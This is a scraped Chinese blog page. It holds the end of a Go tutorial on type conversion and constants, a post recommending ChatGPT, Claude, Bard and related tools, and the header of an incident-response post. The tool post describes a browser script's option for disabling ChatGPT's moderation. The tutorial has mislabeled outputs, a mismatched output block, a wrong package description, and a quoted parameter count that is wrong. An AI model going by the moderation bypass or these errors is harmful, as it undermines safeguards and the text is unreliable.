+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> a <span class="type">int</span> = <span class="number">10</span>      <span class="comment">// 定义一个整型变量并赋值为 10</span></span><br><span class="line">	<span class="keyword">var</span> b <span class="type">string</span> = <span class="string">&quot;10&quot;</span> <span class="comment">// 定义一个字符串类型变量赋值为 &quot;10&quot;</span></span><br><span class="line"></span><br><span class="line">	fmt.Printf(<span class="string">&quot;整型转换为字符串：%s\n&quot;</span>, strconv.Itoa(a))</span><br><span class="line">	tmp, _ := strconv.Atoi(b)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;字符串转换为整型: %d\n&quot;</span>, tmp)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>输出结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">整型转换为字符串：10</span><br><span class="line">字符串转换为整型: 10</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-浮点型和字符串互相转换"><a href="#2-3-浮点型和字符串互相转换" class="headerlink" title="2.3 浮点型和字符串互相转换"></a>2.3 浮点型和字符串互相转换</h3><p>浮点型和字符串的互相转换没有直接封装好的转换接口了，需要调用<code>strconvs</code>包中稍微底层一点的接口。浮点型转字符串使用<code>FormatFloat(float64,byte,int,int)</code>方法，字符串转换为浮点型则使用<code>ParseFloat(...)</code>方法。因为浮点数在存储过程中容易因为<strong>精度问题而存在误差</strong>，所以有时候会将<strong>浮点数转换为字符串</strong>进行存储。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	f1 := <span class="number">0.123456789</span></span><br><span class="line">	s1 := strconv.FormatFloat(f1, <span class="string">&#x27;f&#x27;</span>, <span class="number">-1</span>, <span class="number">32</span>)</span><br><span class="line">	s2 := strconv.FormatFloat(f1, <span class="string">&#x27;f&#x27;</span>, <span class="number">-1</span>, <span class="number">64</span>)</span><br><span class="line">	s3 := <span class="string">&quot;0.123456789&quot;</span></span><br><span class="line">	f2, _ := strconv.ParseFloat(s3, <span class="number">64</span>)</span><br><span class="line">	f3, _ := strconv.ParseFloat(s3, <span class="number">32</span>)</span><br><span class="line">	fmt.Println(<span class="string">&quot;将浮点数转换为float32转换为string: &quot;</span>, s2)</span><br><span class="line">	fmt.Println(<span class="string">&quot;将float64转换为string: &quot;</span>, s1)</span><br><span class="line">	fmt.Println(<span class="string">&quot;将string转换为float64: &quot;</span>, f2)</span><br><span class="line">	fmt.Println(<span class="string">&quot;将string转换为float32再强制转换为float54: &quot;</span>, f3)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>输出结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">将浮点数转换为float32转换为string:  0.123456789</span><br><span class="line">将float64转换为string:  0.12345679</span><br><span class="line">将string转换为float64:  0.123456789</span><br><span class="line">将string转换为float32再强制转换为float54:  0.12345679104328156</span><br></pre></td></tr></table></figure>
+
+<p>Go 语言中各个数据类型的互相强制转换。主要都是依赖与 <code>strconvs</code> 这个第三方包。这个包中还提供了其它很多的转换方法，在做类型转换的时候要注意：<strong>浮点型在转为整型时会失真。</strong></p>
+<h2 id="三、-Go语言的常量"><a href="#三、-Go语言的常量" class="headerlink" title="三、 Go语言的常量"></a>三、 Go语言的常量</h2><p>常量可以理解为是一个存储了不可以改变的值的变量。常量主要用于<strong>特殊值的语义化</strong>，使这些值在更容易维护的情况下不会被程序所修改。Go 语言中声明常量使用的关键字是<code>const</code>。常量的使用非常广泛，比如说圆周率，再比如说一些明确的错误信息等一些容易被<strong>多次使用的值</strong>，一般都会使用常量进行实例化，使其在需要更改时，更容易维护，同时增加代码可读性。</p>
+<h3 id="3-1-常量定义"><a href="#3-1-常量定义" class="headerlink" title="3.1 常量定义"></a>3.1 常量定义</h3><p>常量定义的形式为 <code>const 常量名 常量类型 = 常量值</code></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> c1 <span class="type">string</span> = <span class="string">&quot;2023年4月23日&quot;</span></span><br><span class="line"><span class="keyword">const</span> c2 = <span class="string">&quot;2023年4月23日&quot;</span> <span class="comment">// 和变量一样，常量也可以部使用数据类型直接赋值，其类型和值一致</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(c1)</span><br><span class="line">	fmt.Println(c2)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-2-多常量定义"><a href="#3-2-多常量定义" class="headerlink" title="3.2 多常量定义"></a>3.2 多常量定义</h3><h4 id="3-2-1-普通模式"><a href="#3-2-1-普通模式" class="headerlink" title="3.2.1 普通模式"></a>3.2.1 普通模式</h4><p>和 Go 语言的变量一样，常量也可以进行<strong>多常量定义</strong>。定义形式为<code>const 常量名,常量名= 常量值,常量值</code>。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main  </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line"> <span class="string">&quot;fmt&quot;</span>  </span><br><span class="line">)  </span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> c1, c2 = <span class="string">&quot;2020年3月8日&quot;</span>, <span class="string">&quot;2020年3月9日&quot;</span>  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;  </span><br><span class="line"> fmt.Println(c1)  </span><br><span class="line"> fmt.Println(c2)  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>输出结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2023年4月23日</span><br><span class="line">2023年4月23日</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-2-2-特殊方式"><a href="#3-2-2-特殊方式" class="headerlink" title="3.2.2 特殊方式"></a>3.2.2 特殊方式</h4><p>在常量的使用中，Go 语言还提供了一种特殊的多常量定义方式——<code>const()</code>。这种定义方式也是比较推荐的常量使用方式。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	c1 = <span class="string">&quot;2020年3月8日&quot;</span></span><br><span class="line">	c2 = <span class="string">&quot;2020年3月9日&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(c1)</span><br><span class="line">	fmt.Println(c2)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>输出结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2020年3月8日</span><br><span class="line">2020年3月9日</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://suiyideali.github.io/2023/04/20/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0ch4z">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Geek小黑板">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/20/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/" class="post-title-link" itemprop="url">chatgpt及其大语言模型(LLM)应用</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-04-20 23:38:06" itemprop="dateCreated datePublished" datetime="2023-04-20T23:38:06+08:00">2023-04-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-22 15:33:44" itemprop="dateModified" datetime="2023-04-22T15:33:44+08:00">2023-04-22</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%9D%82%E8%B0%88/" itemprop="url" rel="index"><span itemprop="name">杂谈</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>为了顺应时代浪潮（<del>怕被卷没了</del>），开始使用chatgpt这种大语言模型（LLM）应用了，体验了Chatgpt、谷歌Bard、Claude等国外的LLM应用，主要国内也没获取到相关应用到内测资格 hhh</p>
+<p>其中Chatgpt 和 Claude 算是目前本人的主力使用，对中文也很友好，而且能解决代码开发中的效率问题，妥妥生产力！</p>
+<h2 id="2-大语言模型（LLM）"><a href="#2-大语言模型（LLM）" class="headerlink" title="2. 大语言模型（LLM）"></a>2. 大语言模型（LLM）</h2><p>什么是大语言模型？</p>
+<blockquote>
+<p>大语言模型（LLM）是指能够学习和预测人类自然语言的模型，它使用大规模的文本数据来模拟语言的结构和语法规则。LLM通常使用深度学习算法（如循环神经网络，长短时记忆网络等）来提高预测的准确性，并在自然语言处理任务中取得了很好的效果，如自动问答、机器翻译、文本摘要、语音识别等。大型语言模型在机器学习领域拥有广泛的应用，对人工智能发展有很大的推动作用。</p>
+</blockquote>
+<p>———以上来自 Chatgpt 3.5</p>
+<blockquote>
+<p>大语言模型(Large Language Model,简称LLM)是一类使用神经网络训练的大规模语言模型。它们通常包含数十亿个参数,可以学习无监督的大量文本数据,并生成自然语言。目前较知名的LLM有:</p>
+<ol>
+<li>GPT-3:开放AI旗下的模型,包含175亿个参数,可以生成文本、翻译语言、回答问题等。</li>
+<li>BERT:Google开发的语言表示模型,用于自然语言处理任务,包含110M个参数。</li>
+<li>XLNet:谷歌开发的语言模型,包含110M个参数,在多个自然语言处理任务上超过BERT。</li>
+<li>T5:谷歌开发的文本到文本模型,可以用于生成文本和回答问题,包含11B个参数。</li>
+<li>CTRL:Salesforce开发的语言模型,包含13B个参数,可以生成长篇小说和婚礼誓词等长篇文本。</li>
+</ol>
+<p>LLM的主要特征有:</p>
+<ol>
+<li><p>规模巨大:通常包含几十亿个参数,可以学习海量的数据集。</p>
+</li>
+<li><p>无监督学习:不需要人工标注的数据,可以学习一整个维基百科的数据集。</p>
+</li>
+<li><p>多功能:一个模型可以适用于多种自然语言处理任务,如生成文本、翻译、问答、文本摘要等。</p>
+</li>
+<li><p>超过人类表现:在某些任务上已经超过平均人类表现,如阅读理解。</p>
+<p>目前, LLM仍面临生成的文本安全性、健壮性不足的问题。但未来,随着计算资源的增加和模型的进一步提高,LLM有望在更多语言技术场景中发挥重要作用。总之,大语言模型利用深度神经网络和大数据推动了自然语言处理技术的进步,值得我们持续关注。</p>
+</li>
+</ol>
+</blockquote>
+<p>———以上来自Claude</p>
+<h2 id="3-LLM的应用"><a href="#3-LLM的应用" class="headerlink" title="3. LLM的应用"></a>3. LLM的应用</h2><h3 id="3-1-Chatgpt-（🌟🌟🌟🌟🌟）"><a href="#3-1-Chatgpt-（🌟🌟🌟🌟🌟）" class="headerlink" title="3.1 Chatgpt （🌟🌟🌟🌟🌟）"></a>3.1 Chatgpt （🌟🌟🌟🌟🌟）</h3><p>官网：</p>
+<p><a target="_blank" rel="noopener" href="https://chat.openai.com/">https://chat.openai.com</a></p>
+<p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/chatgpt.png" alt="chatgpt"></p>
+<p>至于怎么注册，网上很多了，这里就不赘述</p>
+<h3 id="3-2-Claude-（🌟🌟🌟🌟）"><a href="#3-2-Claude-（🌟🌟🌟🌟）" class="headerlink" title="3.2 Claude （🌟🌟🌟🌟）"></a>3.2 Claude （🌟🌟🌟🌟）</h3><p>“<a target="_blank" rel="noopener" href="http://mp.weixin.qq.com/s?__biz=MzIzNjc1NzUzMw==&mid=2247663551&idx=1&sn=0b4d22152423c3977c0e81c19d7a2f32&chksm=e8dec8cddfa941db19bb816db380491ae809762479b77f6f4bb037ffb6396900fc26413c1ace&scene=21#wechat_redirect">ChatGPT最强竞品</a>”，Claude，并且在国内不需要爬墙，<strong>开箱即用</strong>。非常便捷。</p>
+<p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/640.png" alt="Claude"></p>
+<p>官网：<a target="_blank" rel="noopener" href="https://www.anthropic.com/claude-in-slack">https://www.anthropic.com/claude-in-slack</a></p>
+<p> 具体测评可看<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/QB85YPjh6DMBTPla4NDfXg">量子位</a>的文章，本文也不多赘述</p>
+<p>放一张使用截图</p>
+<p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230420235742231.png" alt="Claude"></p>
+<p>并且，因为Claude是嵌入在slack里面的一个应用，slack的APP端也能在国内使用，同样做到了开箱即用，即便你没有机场也能正常使用，这也是我非常推荐Claude的原因。下面贴个app端的截图</p>
+<p>如果你在web端就是用了Claude就能在<strong>最近的应用</strong>找到它</p>
+<p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230422151219622.png" alt="app端的Claude"></p>
+<p>打开就能进行对话，开箱即用。</p>
+<p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230422151452112.png" alt="Claude对话"></p>
+<h3 id="3-3-Bard-（🌟🌟）"><a href="#3-3-Bard-（🌟🌟）" class="headerlink" title="3.3 Bard （🌟🌟）"></a>3.3 Bard （🌟🌟）</h3><p>官网：<a target="_blank" rel="noopener" href="https://bard.google.com/">https://bard.google.com</a></p>
+<p>对中文不优化，不咋推荐。</p>
+<p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230421000024812.png" alt="Bard"></p>
+<h2 id="4-依靠chatgpt开发的应用"><a href="#4-依靠chatgpt开发的应用" class="headerlink" title="4. 依靠chatgpt开发的应用"></a>4. 依靠chatgpt开发的应用</h2><h3 id="4-1-chatgpt-vercel"><a href="#4-1-chatgpt-vercel" class="headerlink" title="4.1 chatgpt-vercel"></a>4.1 <strong>chatgpt-vercel</strong></h3><p>开源的项目，基于 <a target="_blank" rel="noopener" href="https://github.com/ddiu8081/chatgpt-demo">chatgpt-demo</a> 开发，可以用<a target="_blank" rel="noopener" href="https://vercel.com/">vercel</a>一键搭建一个，绑定域名灵活使用。</p>
+<p>目前本人也搭建了一个，随手用。不定时更新内置key，</p>
+<p>链接：<a target="_blank" rel="noopener" href="https://www.mochazz.cloud/">https://www.mochazz.cloud/</a></p>
+<p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230421001329154.png" alt="chatgpt-vercel"></p>
+<h3 id="4-2-ChuanhuChatGPT"><a href="#4-2-ChuanhuChatGPT" class="headerlink" title="4.2 ChuanhuChatGPT"></a>4.2 ChuanhuChatGPT</h3><p>另外一个比较优质的开源项目</p>
+<p>为ChatGPT&#x2F;ChatGLM&#x2F;LLaMA等多种LLM提供了一个轻快好用的Web图形界面，也支持一件部署到huggingface上面。</p>
+<p>github地址： <a target="_blank" rel="noopener" href="https://github.com/GaiZhenbiao/ChuanhuChatGPT">https://github.com/GaiZhenbiao/ChuanhuChatGPT</a></p>
+<p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230421001747239.png" alt="ChuanhuChatGPT"></p>
+<h3 id="4-3-Feishu-OpenAI"><a href="#4-3-Feishu-OpenAI" class="headerlink" title="4.3 Feishu-OpenAI"></a>4.3 Feishu-OpenAI</h3><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/ConnectAI-E/Feishu-OpenAI">https://github.com/ConnectAI-E/Feishu-OpenAI</a></p>
+<p>作者为 Connect-AI-E， 机器人功能又多又nice！让工作效率起飞！除了飞书以外的，还有钉钉的chatgpt机器人。具体可看项目。</p>
+<p>项目特点：</p>
+<ul>
+<li>🍏 对话基于 OpenAI-<a target="_blank" rel="noopener" href="https://platform.openai.com/account/api-keys">gpt-3.5-turbo</a> 接口</li>
+<li>🍎 通过 lark，将 ChatGPT 接入<a target="_blank" rel="noopener" href="https://open.feishu.cn/app">飞书</a>和<a target="_blank" rel="noopener" href="https://www.larksuite.com/">飞书国际版</a></li>
+<li>🥒 支持<a target="_blank" rel="noopener" href="https://github.com/serverless-devs/serverless-devs">Serverless 云函数</a>、<a target="_blank" rel="noopener" href="https://dashboard.cpolar.com/login">本地环境</a>、<a target="_blank" rel="noopener" href="https://www.docker.com/">Docker</a>、<a target="_blank" rel="noopener" href="https://github.com/Leizhenpeng/feishu-chatgpt/releases/">二进制安装包</a> 等多种渠道部署</li>
+<li>🍋 基于<a target="_blank" rel="noopener" href="https://github.com/patrickmn/go-cache">goCache</a>内存键值对缓存</li>
+</ul>
+<p>项目部署的方式也很多</p>
+<p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230421002244049.png" alt="项目部署"></p>
+<h2 id="5-Chatgpt相关插件"><a href="#5-Chatgpt相关插件" class="headerlink" title="5.Chatgpt相关插件"></a>5.Chatgpt相关插件</h2><h3 id="5-1-KeepChatGPT"><a href="#5-1-KeepChatGPT" class="headerlink" title="5.1 KeepChatGPT"></a><strong>5.1 KeepChatGPT</strong></h3><p>一个插件，让你的 ChatGPT 不再报错</p>
+<p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230422143858630.png" alt="KeepChatGPT简介"></p>
+<h4 id="5-1-1-安装步骤"><a href="#5-1-1-安装步骤" class="headerlink" title="5.1.1 安装步骤"></a>5.1.1 安装步骤</h4><ul>
+<li>首先需要安装<strong>Tampermonkey</strong></li>
+</ul>
+<ol>
+<li><p>打开油猴脚本官网：<a target="_blank" rel="noopener" href="https://www.tampermonkey.net/">https://www.tampermonkey.net/</a></p>
+</li>
+<li><p>选择你当前的浏览器型号，跳转到浏览器商店安装：</p>
+<p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230422144344712.png" alt="Tampermonkey官网"></p>
+<p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230422144443061.png" alt="安装"></p>
+</li>
+</ol>
+<p>安装完成后会提示你已安装</p>
+<p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230422145144661.png" alt="Tampermonkey成功安装"></p>
+<ul>
+<li>安装<strong>KeepChatGPT</strong></li>
+</ul>
+<p>插件安装成功后，打开 KeepChatGPT 脚本地址：<a target="_blank" rel="noopener" href="https://greasyfork.org/zh-CN/scripts/462804-keepchatgpt">https://greasyfork.org/zh-CN/scripts/462804-keepchatgpt</a></p>
+<p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230422145332001.png" alt="点击安装KeepChatGPT"></p>
+<p>安装完成后打开<a target="_blank" rel="noopener" href="https://chat.openai.com/">https://chat.openai.com/</a></p>
+<p>就能看到左上角出现 KeepChatGPT 的图标，则代表该插件已安装成功。</p>
+<p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230422145526977.png" alt=" KeepChatGPT安装成功"></p>
+<h4 id="5-1-2-基本使用"><a href="#5-1-2-基本使用" class="headerlink" title="5.1.2 基本使用"></a>5.1.2 基本使用</h4><p>把鼠标移动到图标上，会出现 3 个选项。</p>
+<ul>
+<li><p><code>显示调试</code>：主要用于观测脚本的运行过程；</p>
+</li>
+<li><p><code>暗色主题</code>：用于图标的颜色切换；</p>
+</li>
+<li><p><code>取消审计</code>：让 ChatGPT 输出更多丰富的内容，尺度较大</p>
+</li>
+</ul>
+<p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230422145741676.png" alt="基本功能"></p>
+<p>到此，KeepChatGPT就能正常使用了，解决掉因为网络导致 ChatGPT 报错这个问题。</p>
+<h2 id="6-后续"><a href="#6-后续" class="headerlink" title="6. 后续"></a>6. 后续</h2><p>后续会不定期更新一些非常不错的AI相关的应用，以及chatgpt相关插件、AIGC相关的内容。</p>
+<h2 id="7-参考来源"><a href="#7-参考来源" class="headerlink" title="7. 参考来源"></a>7. 参考来源</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://chat.openai.com/">https://chat.openai.com</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/QB85YPjh6DMBTPla4NDfXg">https://mp.weixin.qq.com/s/QB85YPjh6DMBTPla4NDfXg</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.anthropic.com/claude-in-slack">https://www.anthropic.com/claude-in-slack</a></li>
+<li><a target="_blank" rel="noopener" href="https://vercel.com/">https://vercel.com/</a></li>
+<li><a target="_blank" rel="noopener" href="https://huggingface.co/">https://huggingface.co</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/ConnectAI-E/Feishu-OpenAI">https://github.com/ConnectAI-E/Feishu-OpenAI</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/LPB4X99pV7KuExWHcBqugA">https://mp.weixin.qq.com/s/LPB4X99pV7KuExWHcBqugA</a></li>
+<li><a target="_blank" rel="noopener" href="https://greasyfork.org/zh-CN/scripts/462804-keepchatgpt">https://greasyfork.org/zh-CN/scripts/462804-keepchatgpt</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.tampermonkey.net/">https://www.tampermonkey.net/</a></li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://suiyideali.github.io/2023/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0ch4z">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Geek小黑板">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/" class="post-title-link" itemprop="url">应急响应初探</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-04-20 23:00:44" itemprop="dateCreated datePublished" datetime="2023-04-20T23:00:44+08:00">2023-04-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-12-14 10:32:58" itemprop="dateModified" datetime="2023-12-14T10:32:58+08:00">2023-12-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" itemprop="url" rel="index"><span itemprop="name">应急响应</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
